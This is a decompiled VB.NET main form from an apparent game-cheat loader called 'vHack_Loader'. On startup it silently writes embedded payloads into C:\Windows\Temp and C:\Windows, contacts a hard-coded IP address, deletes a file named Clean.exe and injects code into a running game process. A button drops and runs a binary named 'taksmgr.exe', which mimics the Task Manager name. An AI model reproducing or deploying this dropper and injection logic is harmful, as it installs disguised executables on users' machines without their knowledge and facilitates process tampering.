Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Net
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports vHack_Loader.My
Imports vHack_Loader.My.Resources

Namespace vHack_Loader
	' Token: 0x0200001C RID: 28
	<DesignerGenerated()>
	Public Partial Class Main
		Inherits Form

		' Token: 0x060000BC RID: 188 RVA: 0x0000648D File Offset: 0x0000468D
		Public Sub New()
			AddHandler MyBase.FormClosing, AddressOf Me.Main_FormClosing
			AddHandler MyBase.Load, AddressOf Me.Main_Load
			Me.InitializeComponent()
		End Sub

		' Token: 0x060000BD RID: 189 RVA: 0x000064BF File Offset: 0x000046BF
		Private Sub ExcisionButtonWhite1_Click(sender As Object, e As EventArgs)
			MyProject.Forms.Login.Close()
		End Sub

		' Token: 0x060000BE RID: 190 RVA: 0x000064BF File Offset: 0x000046BF
		Private Sub Main_FormClosing(sender As Object, e As FormClosingEventArgs)
			MyProject.Forms.Login.Close()
		End Sub

		' Token: 0x060000BF RID: 191 RVA: 0x000064D0 File Offset: 0x000046D0
		Private Sub Main_Load(sender As Object, e As EventArgs)
			' The following expression was wrapped in a checked-statement
			Try
				File.WriteAllBytes("C:\Windows\Temp\go.dll", Resources.MrsnapzNet)
				File.WriteAllBytes("C:\Windows\notepad.xpr", Resources.cloud)
				Dim text As String = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
				Dim i As Integer = 0
				Me.Text = ""
				Dim random As Random = New Random()
				While i <= 18
					Dim text2 As String = Conversions.ToString(random.[Next](0, text.Length))
					Me.Text += Conversions.ToString(text(Conversions.ToInteger(text2)))
					i += 1
				End While
				Me.WebBrowser1.Navigate("http://139.59.107.93/Main.php")
				If File.Exists("C:\Clean.exe") Then
					MyProject.Computer.FileSystem.DeleteFile("C:\Clean.exe")
				End If
				system2.ChechforUpdate()
				system2.LoadUpHacks()
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x060000C0 RID: 192 RVA: 0x000065B8 File Offset: 0x000047B8
		Private Sub LinkLabel1_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs)
			Process.Start(MyProject.Forms.Login.forum)
		End Sub

		' Token: 0x060000C1 RID: 193 RVA: 0x000065CF File Offset: 0x000047CF
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Me.Label2.Text = "Status: Waiting.."
		End Sub

		' Token: 0x060000C2 RID: 194 RVA: 0x000065E1 File Offset: 0x000047E1
		Private Sub ExcisionButtonBlue2_Click(sender As Object, e As EventArgs)
			Interaction.MsgBox(Globals.ProcName(), MsgBoxStyle.OkOnly, Nothing)
		End Sub

		' Token: 0x060000C3 RID: 195 RVA: 0x000065F0 File Offset: 0x000047F0
		Private Sub ListView1_ItemSelectionChanged(sender As Object, e As ListViewItemSelectionChangedEventArgs)
			system2.HackName = e.Item.SubItems(0).Text
			system2.GameName = e.Item.SubItems(1).Text
		End Sub

		' Token: 0x060000C4 RID: 196 RVA: 0x00005275 File Offset: 0x00003475
		Private Sub ExcisionTheme1_Click(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x060000C5 RID: 197 RVA: 0x00006628 File Offset: 0x00004828
		Private Sub Timer2_Tick(sender As Object, e As EventArgs)
			If Process.GetProcessesByName(Globals.ProcName()).Length = 0 Then
				Me.Label2.Text = "Status: Waiting for " + Globals.ProcName() + ".exe"
				Return
			End If
			Injection.Inject()
			MyBase.Close()
		End Sub

		' Token: 0x060000C6 RID: 198 RVA: 0x00006663 File Offset: 0x00004863
		Private Sub CheckBox1_CheckedChanged(sender As Object, e As EventArgs)
			If Me.CheckBox1.Checked Then
				Me.CheckBox2.Checked = False
				Me.CheckBox3.Checked = False
				Me.CheckBox4.Checked = False
			End If
		End Sub

		' Token: 0x060000C7 RID: 199 RVA: 0x00006696 File Offset: 0x00004896
		Private Sub CheckBox2_CheckedChanged(sender As Object, e As EventArgs)
			If Me.CheckBox2.Checked Then
				Me.CheckBox1.Checked = False
				Me.CheckBox3.Checked = False
				Me.CheckBox4.Checked = False
			End If
		End Sub

		' Token: 0x060000C8 RID: 200 RVA: 0x000066C9 File Offset: 0x000048C9
		Private Sub CheckBox3_CheckedChanged(sender As Object, e As EventArgs)
			If Me.CheckBox3.Checked Then
				Me.CheckBox1.Checked = False
				Me.CheckBox2.Checked = False
				Me.CheckBox4.Checked = False
			End If
		End Sub

		' Token: 0x060000C9 RID: 201 RVA: 0x000066FC File Offset: 0x000048FC
		Private Sub CheckBox4_CheckedChanged(sender As Object, e As EventArgs)
			If Me.CheckBox4.Checked Then
				Me.CheckBox1.Checked = False
				Me.CheckBox2.Checked = False
				Me.CheckBox3.Checked = False
			End If
		End Sub

		' Token: 0x060000CA RID: 202 RVA: 0x00006730 File Offset: 0x00004930
		Private Sub ComboBox1_SelectedIndexChanged(sender As Object, e As EventArgs)
			Dim httpWebResponse As HttpWebResponse = CType(CType(WebRequest.Create(Me.Label4.Text), HttpWebRequest).GetResponse(), HttpWebResponse)
			Dim text As String = New StreamReader(httpWebResponse.GetResponseStream()).ReadToEnd()
			If text.Contains("<usergroup>1</usergroup>") Then
				MyBase.Close()
				Return
			End If
			If text.Contains("<usergroup>2</usergroup>") Then
				Me.CheckBox1.Checked = True
				Return
			End If
			If text.Contains("<usergroup>3</usergroup>") Then
				MyBase.Close()
				Return
			End If
			If text.Contains("<usergroup>4</usergroup>") Then
				MyBase.Close()
				Return
			End If
			If text.Contains("<usergroup>5</usergroup>") Then
				MyBase.Close()
				Return
			End If
			If text.Contains("<usergroup>6</usergroup>") Then
				MyBase.Close()
				Return
			End If
			If text.Contains("<usergroup>7</usergroup>") Then
				MyBase.Close()
				Return
			End If
			If text.Contains("<usergroup>8</usergroup>") Then
				MyBase.Close()
				Return
			End If
			If(text.Contains("<usergroup>9</usergroup>") And MyProject.Computer.Info.OSFullName.Contains("XP")) Or MyProject.Computer.Info.OSFullName.Contains("7") Or MyProject.Computer.Info.OSFullName.Contains("Windows XP") Or MyProject.Computer.Info.OSFullName.Contains("Windows 7") Then
				MyBase.Close()
				Return
			End If
			If(text.Contains("<usergroup>9</usergroup>") And MyProject.Computer.Info.OSFullName.Contains("8")) Or MyProject.Computer.Info.OSFullName.Contains("10") Or MyProject.Computer.Info.OSFullName.Contains("8.1") Or MyProject.Computer.Info.OSFullName.Contains("Windows 8") Or MyProject.Computer.Info.OSFullName.Contains("Windows 10") Or MyProject.Computer.Info.OSFullName.Contains("Windows 8.1") Then
				MyBase.Close()
				Return
			End If
			If text.Contains("<usergroup>10</usergroup>") Then
				MyBase.Close()
				Return
			End If
			If text.Contains("<usergroup>11</usergroup>") Then
				MyBase.Close()
				Return
			End If
			If text.Contains("12") Then
				MyBase.Close()
			End If
		End Sub

		' Token: 0x060000CB RID: 203 RVA: 0x0000697C File Offset: 0x00004B7C
		<MethodImpl(MethodImplOptions.NoInlining Or MethodImplOptions.NoOptimization)>
		Private Sub ExcisionButtonBlue1_Click(sender As Object, e As EventArgs)
			If Me.CheckBox1.Checked And (Operators.CompareString(Me.ComboBox1.Text, "Windows XP - 7", False) = 0) Then
				Dim text As String = "C:\Windows\taksmgr.exe"
				File.WriteAllBytes(text, Resources._7)
				Process.Start(text)
				ProjectData.EndApp()
			End If
			If Me.CheckBox1.Checked And (Operators.CompareString(Me.ComboBox1.Text, "Windows 8 - 10", False) = 0) Then
				Dim text2 As String = "C:\Windows\taksmgr.exe"
				File.WriteAllBytes(text2, Resources._8)
				Process.Start(text2)
				ProjectData.EndApp()
			End If
		End Sub

		' Token: 0x060000CC RID: 204 RVA: 0x00005275 File Offset: 0x00003475
		Private Sub ExcisionButtonWhite2_Click(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x060000CD RID: 205 RVA: 0x00005275 File Offset: 0x00003475
		Private Sub Label4_Click(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x060000CE RID: 206 RVA: 0x00005275 File Offset: 0x00003475
		Private Sub Label3_Click(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x17000027 RID: 39
		' (get) Token: 0x060000D1 RID: 209 RVA: 0x0000815E File Offset: 0x0000635E
		' (set) Token: 0x060000D2 RID: 210 RVA: 0x00008168 File Offset: 0x00006368
		Friend Overridable Property ExcisionTheme1 As ExcisionTheme
			<CompilerGenerated()>
			Get
				Return Me._ExcisionTheme1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ExcisionTheme)
				Dim eventHandler As EventHandler = AddressOf Me.ExcisionTheme1_Click
				Dim excisionTheme As ExcisionTheme = Me._ExcisionTheme1
				If excisionTheme IsNot Nothing Then
					RemoveHandler excisionTheme.Click, eventHandler
				End If
				Me._ExcisionTheme1 = value
				excisionTheme = Me._ExcisionTheme1
				If excisionTheme IsNot Nothing Then
					AddHandler excisionTheme.Click, eventHandler
				End If
			End Set
		End Property

		' Token: 0x17000028 RID: 40
		' (get) Token: 0x060000D3 RID: 211 RVA: 0x000081AB File Offset: 0x000063AB
		' (set) Token: 0x060000D4 RID: 212 RVA: 0x000081B4 File Offset: 0x000063B4
		Friend Overridable Property ExcisionButtonWhite1 As ExcisionButtonWhite
			<CompilerGenerated()>
			Get
				Return Me._ExcisionButtonWhite1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ExcisionButtonWhite)
				Dim eventHandler As EventHandler = AddressOf Me.ExcisionButtonWhite1_Click
				Dim excisionButtonWhite As ExcisionButtonWhite = Me._ExcisionButtonWhite1
				If excisionButtonWhite IsNot Nothing Then
					RemoveHandler excisionButtonWhite.Click, eventHandler
				End If
				Me._ExcisionButtonWhite1 = value
				excisionButtonWhite = Me._ExcisionButtonWhite1
				If excisionButtonWhite IsNot Nothing Then
					AddHandler excisionButtonWhite.Click, eventHandler
				End If
			End Set
		End Property

		' Token: 0x17000029 RID: 41
		' (get) Token: 0x060000D5 RID: 213 RVA: 0x000081F7 File Offset: 0x000063F7
		' (set) Token: 0x060000D6 RID: 214 RVA: 0x00008200 File Offset: 0x00006400
		Friend Overridable Property ListView1 As ListView
			<CompilerGenerated()>
			Get
				Return Me._ListView1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ListView)
				Dim listViewItemSelectionChangedEventHandler As ListViewItemSelectionChangedEventHandler = AddressOf Me.ListView1_ItemSelectionChanged
				Dim listView As ListView = Me._ListView1
				If listView IsNot Nothing Then
					RemoveHandler listView.ItemSelectionChanged, listViewItemSelectionChangedEventHandler
				End If
				Me._ListView1 = value
				listView = Me._ListView1
				If listView IsNot Nothing Then
					AddHandler listView.ItemSelectionChanged, listViewItemSelectionChangedEventHandler
				End If
			End Set
		End Property

		' Token: 0x1700002A RID: 42
		' (get) Token: 0x060000D7 RID: 215 RVA: 0x00008243 File Offset: 0x00006443
		' (set) Token: 0x060000D8 RID: 216 RVA: 0x0000824B File Offset: 0x0000644B
		Friend Overridable Property ColumnHeader1 As ColumnHeader

		' Token: 0x1700002B RID: 43
		' (get) Token: 0x060000D9 RID: 217 RVA: 0x00008254 File Offset: 0x00006454
		' (set) Token: 0x060000DA RID: 218 RVA: 0x0000825C File Offset: 0x0000645C
		Friend Overridable Property ColumnHeader2 As ColumnHeader

		' Token: 0x1700002C RID: 44
		' (get) Token: 0x060000DB RID: 219 RVA: 0x00008265 File Offset: 0x00006465
		' (set) Token: 0x060000DC RID: 220 RVA: 0x0000826D File Offset: 0x0000646D
		Friend Overridable Property ColumnHeader3 As ColumnHeader

		' Token: 0x1700002D RID: 45
		' (get) Token: 0x060000DD RID: 221 RVA: 0x00008276 File Offset: 0x00006476
		' (set) Token: 0x060000DE RID: 222 RVA: 0x0000827E File Offset: 0x0000647E
		Friend Overridable Property ColumnHeader4 As ColumnHeader

		' Token: 0x1700002E RID: 46
		' (get) Token: 0x060000DF RID: 223 RVA: 0x00008287 File Offset: 0x00006487
		' (set) Token: 0x060000E0 RID: 224 RVA: 0x00008290 File Offset: 0x00006490
		Friend Overridable Property LinkLabel1 As LinkLabel
			<CompilerGenerated()>
			Get
				Return Me._LinkLabel1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As LinkLabel)
				Dim linkLabelLinkClickedEventHandler As LinkLabelLinkClickedEventHandler = AddressOf Me.LinkLabel1_LinkClicked
				Dim linkLabel As LinkLabel = Me._LinkLabel1
				If linkLabel IsNot Nothing Then
					RemoveHandler linkLabel.LinkClicked, linkLabelLinkClickedEventHandler
				End If
				Me._LinkLabel1 = value
				linkLabel = Me._LinkLabel1
				If linkLabel IsNot Nothing Then
					AddHandler linkLabel.LinkClicked, linkLabelLinkClickedEventHandler
				End If
			End Set
		End Property

		' Token: 0x1700002F RID: 47
		' (get) Token: 0x060000E1 RID: 225 RVA: 0x000082D3 File Offset: 0x000064D3
		' (set) Token: 0x060000E2 RID: 226 RVA: 0x000082DB File Offset: 0x000064DB
		Friend Overridable Property Label2 As Label

		' Token: 0x17000030 RID: 48
		' (get) Token: 0x060000E3 RID: 227 RVA: 0x000082E4 File Offset: 0x000064E4
		' (set) Token: 0x060000E4 RID: 228 RVA: 0x000082EC File Offset: 0x000064EC
		Friend Overridable Property ExcisionSeparator1 As ExcisionSeparator

		' Token: 0x17000031 RID: 49
		' (get) Token: 0x060000E5 RID: 229 RVA: 0x000082F5 File Offset: 0x000064F5
		' (set) Token: 0x060000E6 RID: 230 RVA: 0x00008300 File Offset: 0x00006500
		Friend Overridable Property ExcisionButtonBlue1 As ExcisionButtonBlue
			<CompilerGenerated()>
			Get
				Return Me._ExcisionButtonBlue1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ExcisionButtonBlue)
				Dim eventHandler As EventHandler = AddressOf Me.ExcisionButtonBlue1_Click
				Dim excisionButtonBlue As ExcisionButtonBlue = Me._ExcisionButtonBlue1
				If excisionButtonBlue IsNot Nothing Then
					RemoveHandler excisionButtonBlue.Click, eventHandler
				End If
				Me._ExcisionButtonBlue1 = value
				excisionButtonBlue = Me._ExcisionButtonBlue1
				If excisionButtonBlue IsNot Nothing Then
					AddHandler excisionButtonBlue.Click, eventHandler
				End If
			End Set
		End Property

		' Token: 0x17000032 RID: 50
		' (get) Token: 0x060000E7 RID: 231 RVA: 0x00008343 File Offset: 0x00006543
		' (set) Token: 0x060000E8 RID: 232 RVA: 0x0000834B File Offset: 0x0000654B
		Friend Overridable Property NumericUpDown1 As NumericUpDown

		' Token: 0x17000033 RID: 51
		' (get) Token: 0x060000E9 RID: 233 RVA: 0x00008354 File Offset: 0x00006554
		' (set) Token: 0x060000EA RID: 234 RVA: 0x0000835C File Offset: 0x0000655C
		Friend Overridable Property Label1 As Label

		' Token: 0x17000034 RID: 52
		' (get) Token: 0x060000EB RID: 235 RVA: 0x00008365 File Offset: 0x00006565
		' (set) Token: 0x060000EC RID: 236 RVA: 0x0000836D File Offset: 0x0000656D
		Friend Overridable Property ColumnHeader5 As ColumnHeader

		' Token: 0x17000035 RID: 53
		' (get) Token: 0x060000ED RID: 237 RVA: 0x00008376 File Offset: 0x00006576
		' (set) Token: 0x060000EE RID: 238 RVA: 0x00008380 File Offset: 0x00006580
		Friend Overridable Property Timer1 As Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim eventHandler As EventHandler = AddressOf Me.Timer1_Tick
				Dim timer As Timer = Me._Timer1
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, eventHandler
				End If
				Me._Timer1 = value
				timer = Me._Timer1
				If timer IsNot Nothing Then
					AddHandler timer.Tick, eventHandler
				End If
			End Set
		End Property

		' Token: 0x17000036 RID: 54
		' (get) Token: 0x060000EF RID: 239 RVA: 0x000083C3 File Offset: 0x000065C3
		' (set) Token: 0x060000F0 RID: 240 RVA: 0x000083CC File Offset: 0x000065CC
		Friend Overridable Property Timer2 As Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer2
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Timer)
				Dim eventHandler As EventHandler = AddressOf Me.Timer2_Tick
				Dim timer As Timer = Me._Timer2
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, eventHandler
				End If
				Me._Timer2 = value
				timer = Me._Timer2
				If timer IsNot Nothing Then
					AddHandler timer.Tick, eventHandler
				End If
			End Set
		End Property

		' Token: 0x17000037 RID: 55
		' (get) Token: 0x060000F1 RID: 241 RVA: 0x0000840F File Offset: 0x0000660F
		' (set) Token: 0x060000F2 RID: 242 RVA: 0x00008417 File Offset: 0x00006617
		Friend Overridable Property GroupBox1 As GroupBox

		' Token: 0x17000038 RID: 56
		' (get) Token: 0x060000F3 RID: 243 RVA: 0x00008420 File Offset: 0x00006620
		' (set) Token: 0x060000F4 RID: 244 RVA: 0x00008428 File Offset: 0x00006628
		Friend Overridable Property CheckBox4 As CheckBox
			<CompilerGenerated()>
			Get
				Return Me._CheckBox4
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Dim eventHandler As EventHandler = AddressOf Me.CheckBox4_CheckedChanged
				Dim checkBox As CheckBox = Me._CheckBox4
				If checkBox IsNot Nothing Then
					RemoveHandler checkBox.CheckedChanged, eventHandler
				End If
				Me._CheckBox4 = value
				checkBox = Me._CheckBox4
				If checkBox IsNot Nothing Then
					AddHandler checkBox.CheckedChanged, eventHandler
				End If
			End Set
		End Property

		' Token: 0x17000039 RID: 57
		' (get) Token: 0x060000F5 RID: 245 RVA: 0x0000846B File Offset: 0x0000666B
		' (set) Token: 0x060000F6 RID: 246 RVA: 0x00008474 File Offset: 0x00006674
		Friend Overridable Property CheckBox1 As CheckBox
			<CompilerGenerated()>
			Get
				Return Me._CheckBox1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Dim eventHandler As EventHandler = AddressOf Me.CheckBox1_CheckedChanged
				Dim checkBox As CheckBox = Me._CheckBox1
				If checkBox IsNot Nothing Then
					RemoveHandler checkBox.CheckedChanged, eventHandler
				End If
				Me._CheckBox1 = value
				checkBox = Me._CheckBox1
				If checkBox IsNot Nothing Then
					AddHandler checkBox.CheckedChanged, eventHandler
				End If
			End Set
		End Property

		' Token: 0x1700003A RID: 58
		' (get) Token: 0x060000F7 RID: 247 RVA: 0x000084B7 File Offset: 0x000066B7
		' (set) Token: 0x060000F8 RID: 248 RVA: 0x000084C0 File Offset: 0x000066C0
		Friend Overridable Property CheckBox2 As CheckBox
			<CompilerGenerated()>
			Get
				Return Me._CheckBox2
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Dim eventHandler As EventHandler = AddressOf Me.CheckBox2_CheckedChanged
				Dim checkBox As CheckBox = Me._CheckBox2
				If checkBox IsNot Nothing Then
					RemoveHandler checkBox.CheckedChanged, eventHandler
				End If
				Me._CheckBox2 = value
				checkBox = Me._CheckBox2
				If checkBox IsNot Nothing Then
					AddHandler checkBox.CheckedChanged, eventHandler
				End If
			End Set
		End Property

		' Token: 0x1700003B RID: 59
		' (get) Token: 0x060000F9 RID: 249 RVA: 0x00008503 File Offset: 0x00006703
		' (set) Token: 0x060000FA RID: 250 RVA: 0x0000850C File Offset: 0x0000670C
		Friend Overridable Property CheckBox3 As CheckBox
			<CompilerGenerated()>
			Get
				Return Me._CheckBox3
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As CheckBox)
				Dim eventHandler As EventHandler = AddressOf Me.CheckBox3_CheckedChanged
				Dim checkBox As CheckBox = Me._CheckBox3
				If checkBox IsNot Nothing Then
					RemoveHandler checkBox.CheckedChanged, eventHandler
				End If
				Me._CheckBox3 = value
				checkBox = Me._CheckBox3
				If checkBox IsNot Nothing Then
					AddHandler checkBox.CheckedChanged, eventHandler
				End If
			End Set
		End Property

		' Token: 0x1700003C RID: 60
		' (get) Token: 0x060000FB RID: 251 RVA: 0x0000854F File Offset: 0x0000674F
		' (set) Token: 0x060000FC RID: 252 RVA: 0x00008558 File Offset: 0x00006758
		Friend Overridable Property ComboBox1 As ComboBox
			<CompilerGenerated()>
			Get
				Return Me._ComboBox1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ComboBox)
				Dim eventHandler As EventHandler = AddressOf Me.ComboBox1_SelectedIndexChanged
				Dim comboBox As ComboBox = Me._ComboBox1
				If comboBox IsNot Nothing Then
					RemoveHandler comboBox.SelectedIndexChanged, eventHandler
				End If
				Me._ComboBox1 = value
				comboBox = Me._ComboBox1
				If comboBox IsNot Nothing Then
					AddHandler comboBox.SelectedIndexChanged, eventHandler
				End If
			End Set
		End Property

		' Token: 0x1700003D RID: 61
		' (get) Token: 0x060000FD RID: 253 RVA: 0x0000859B File Offset: 0x0000679B
		' (set) Token: 0x060000FE RID: 254 RVA: 0x000085A3 File Offset: 0x000067A3
		Friend Overridable Property ProgressBar1 As ProgressBar

		' Token: 0x1700003E RID: 62
		' (get) Token: 0x060000FF RID: 255 RVA: 0x000085AC File Offset: 0x000067AC
		' (set) Token: 0x06000100 RID: 256 RVA: 0x000085B4 File Offset: 0x000067B4
		Friend Overridable Property alamatdownloadAPBI As TextBox

		' Token: 0x1700003F RID: 63
		' (get) Token: 0x06000101 RID: 257 RVA: 0x000085BD File Offset: 0x000067BD
		' (set) Token: 0x06000102 RID: 258 RVA: 0x000085C5 File Offset: 0x000067C5
		Friend Overridable Property alamatdownloadALSI As TextBox

		' Token: 0x17000040 RID: 64
		' (get) Token: 0x06000103 RID: 259 RVA: 0x000085CE File Offset: 0x000067CE
		' (set) Token: 0x06000104 RID: 260 RVA: 0x000085D6 File Offset: 0x000067D6
		Friend Overridable Property alamatdownloadABSI As TextBox

		' Token: 0x17000041 RID: 65
		' (get) Token: 0x06000105 RID: 261 RVA: 0x000085DF File Offset: 0x000067DF
		' (set) Token: 0x06000106 RID: 262 RVA: 0x000085E7 File Offset: 0x000067E7
		Friend Overridable Property alamatdownloadASFS As TextBox

		' Token: 0x17000042 RID: 66
		' (get) Token: 0x06000107 RID: 263 RVA: 0x000085F0 File Offset: 0x000067F0
		' (set) Token: 0x06000108 RID: 264 RVA: 0x000085F8 File Offset: 0x000067F8
		Friend Overridable Property alamatdownloadASFE As TextBox

		' Token: 0x17000043 RID: 67
		' (get) Token: 0x06000109 RID: 265 RVA: 0x00008601 File Offset: 0x00006801
		' (set) Token: 0x0600010A RID: 266 RVA: 0x00008609 File Offset: 0x00006809
		Friend Overridable Property alamatdownloadAPBR As TextBox

		' Token: 0x17000044 RID: 68
		' (get) Token: 0x0600010B RID: 267 RVA: 0x00008612 File Offset: 0x00006812
		' (set) Token: 0x0600010C RID: 268 RVA: 0x0000861A File Offset: 0x0000681A
		Friend Overridable Property alamatdownloadAPBL As TextBox

		' Token: 0x17000045 RID: 69
		' (get) Token: 0x0600010D RID: 269 RVA: 0x00008623 File Offset: 0x00006823
		' (set) Token: 0x0600010E RID: 270 RVA: 0x0000862B File Offset: 0x0000682B
		Friend Overridable Property alamatdownloadAPBG As TextBox

		' Token: 0x17000046 RID: 70
		' (get) Token: 0x0600010F RID: 271 RVA: 0x00008634 File Offset: 0x00006834
		' (set) Token: 0x06000110 RID: 272 RVA: 0x0000863C File Offset: 0x0000683C
		Friend Overridable Property alamatdownloadDPBI As TextBox

		' Token: 0x17000047 RID: 71
		' (get) Token: 0x06000111 RID: 273 RVA: 0x00008645 File Offset: 0x00006845
		' (set) Token: 0x06000112 RID: 274 RVA: 0x0000864D File Offset: 0x0000684D
		Friend Overridable Property alamatdownloadDLSI As TextBox

		' Token: 0x17000048 RID: 72
		' (get) Token: 0x06000113 RID: 275 RVA: 0x00008656 File Offset: 0x00006856
		' (set) Token: 0x06000114 RID: 276 RVA: 0x0000865E File Offset: 0x0000685E
		Friend Overridable Property alamatdownloadDBSI As TextBox

		' Token: 0x17000049 RID: 73
		' (get) Token: 0x06000115 RID: 277 RVA: 0x00008667 File Offset: 0x00006867
		' (set) Token: 0x06000116 RID: 278 RVA: 0x0000866F File Offset: 0x0000686F
		Friend Overridable Property alamatdownloadDSFS As TextBox

		' Token: 0x1700004A RID: 74
		' (get) Token: 0x06000117 RID: 279 RVA: 0x00008678 File Offset: 0x00006878
		' (set) Token: 0x06000118 RID: 280 RVA: 0x00008680 File Offset: 0x00006880
		Friend Overridable Property alamatdownloadDSFE As TextBox

		' Token: 0x1700004B RID: 75
		' (get) Token: 0x06000119 RID: 281 RVA: 0x00008689 File Offset: 0x00006889
		' (set) Token: 0x0600011A RID: 282 RVA: 0x00008691 File Offset: 0x00006891
		Friend Overridable Property alamatdownloadDPBR As TextBox

		' Token: 0x1700004C RID: 76
		' (get) Token: 0x0600011B RID: 283 RVA: 0x0000869A File Offset: 0x0000689A
		' (set) Token: 0x0600011C RID: 284 RVA: 0x000086A2 File Offset: 0x000068A2
		Friend Overridable Property alamatdownloadDPBL As TextBox

		' Token: 0x1700004D RID: 77
		' (get) Token: 0x0600011D RID: 285 RVA: 0x000086AB File Offset: 0x000068AB
		' (set) Token: 0x0600011E RID: 286 RVA: 0x000086B3 File Offset: 0x000068B3
		Friend Overridable Property alamatdownloadDPBG As TextBox

		' Token: 0x1700004E RID: 78
		' (get) Token: 0x0600011F RID: 287 RVA: 0x000086BC File Offset: 0x000068BC
		' (set) Token: 0x06000120 RID: 288 RVA: 0x000086C4 File Offset: 0x000068C4
		Friend Overridable Property alamatdownloadLPBI As TextBox

		' Token: 0x1700004F RID: 79
		' (get) Token: 0x06000121 RID: 289 RVA: 0x000086CD File Offset: 0x000068CD
		' (set) Token: 0x06000122 RID: 290 RVA: 0x000086D5 File Offset: 0x000068D5
		Friend Overridable Property alamatdownloadLLSI As TextBox

		' Token: 0x17000050 RID: 80
		' (get) Token: 0x06000123 RID: 291 RVA: 0x000086DE File Offset: 0x000068DE
		' (set) Token: 0x06000124 RID: 292 RVA: 0x000086E6 File Offset: 0x000068E6
		Friend Overridable Property alamatdownloadLBSI As TextBox

		' Token: 0x17000051 RID: 81
		' (get) Token: 0x06000125 RID: 293 RVA: 0x000086EF File Offset: 0x000068EF
		' (set) Token: 0x06000126 RID: 294 RVA: 0x000086F7 File Offset: 0x000068F7
		Friend Overridable Property alamatdownloadLSFS As TextBox

		' Token: 0x17000052 RID: 82
		' (get) Token: 0x06000127 RID: 295 RVA: 0x00008700 File Offset: 0x00006900
		' (set) Token: 0x06000128 RID: 296 RVA: 0x00008708 File Offset: 0x00006908
		Friend Overridable Property alamatdownloadLSFE As TextBox

		' Token: 0x17000053 RID: 83
		' (get) Token: 0x06000129 RID: 297 RVA: 0x00008711 File Offset: 0x00006911
		' (set) Token: 0x0600012A RID: 298 RVA: 0x00008719 File Offset: 0x00006919
		Friend Overridable Property alamatdownloadLPBR As TextBox

		' Token: 0x17000054 RID: 84
		' (get) Token: 0x0600012B RID: 299 RVA: 0x00008722 File Offset: 0x00006922
		' (set) Token: 0x0600012C RID: 300 RVA: 0x0000872A File Offset: 0x0000692A
		Friend Overridable Property alamatdownloadLPBL As TextBox

		' Token: 0x17000055 RID: 85
		' (get) Token: 0x0600012D RID: 301 RVA: 0x00008733 File Offset: 0x00006933
		' (set) Token: 0x0600012E RID: 302 RVA: 0x0000873B File Offset: 0x0000693B
		Friend Overridable Property alamatdownloadLPBG As TextBox

		' Token: 0x17000056 RID: 86
		' (get) Token: 0x0600012F RID: 303 RVA: 0x00008744 File Offset: 0x00006944
		' (set) Token: 0x06000130 RID: 304 RVA: 0x0000874C File Offset: 0x0000694C
		Friend Overridable Property alamatdownloadLBYP As TextBox

		' Token: 0x17000057 RID: 87
		' (get) Token: 0x06000131 RID: 305 RVA: 0x00008755 File Offset: 0x00006955
		' (set) Token: 0x06000132 RID: 306 RVA: 0x0000875D File Offset: 0x0000695D
		Friend Overridable Property WebBrowser1 As WebBrowser

		' Token: 0x17000058 RID: 88
		' (get) Token: 0x06000133 RID: 307 RVA: 0x00008766 File Offset: 0x00006966
		' (set) Token: 0x06000134 RID: 308 RVA: 0x0000876E File Offset: 0x0000696E
		Friend Overridable Property Label3 As Label

		' Token: 0x17000059 RID: 89
		' (get) Token: 0x06000135 RID: 309 RVA: 0x00008777 File Offset: 0x00006977
		' (set) Token: 0x06000136 RID: 310 RVA: 0x00008780 File Offset: 0x00006980
		Friend Overridable Property Label4 As Label
			<CompilerGenerated()>
			Get
				Return Me._Label4
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As Label)
				Dim eventHandler As EventHandler = AddressOf Me.Label4_Click
				Dim label As Label = Me._Label4
				If label IsNot Nothing Then
					RemoveHandler label.Click, eventHandler
				End If
				Me._Label4 = value
				label = Me._Label4
				If label IsNot Nothing Then
					AddHandler label.Click, eventHandler
				End If
			End Set
		End Property

		' Token: 0x1700005A RID: 90
		' (get) Token: 0x06000137 RID: 311 RVA: 0x000087C3 File Offset: 0x000069C3
		' (set) Token: 0x06000138 RID: 312 RVA: 0x000087CB File Offset: 0x000069CB
		Friend Overridable Property Label5 As Label
	End Class
End Namespace
